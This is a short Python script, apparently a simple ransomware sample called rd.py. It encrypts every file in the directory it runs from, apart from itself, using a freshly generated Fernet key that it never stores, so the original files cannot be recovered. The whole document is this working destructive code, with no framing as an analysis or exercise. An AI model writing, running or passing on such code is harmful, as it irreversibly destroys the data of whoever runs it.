#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#rd.py File Start:

files = []
for file in os.listdir():
    if file == "rd.py":
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)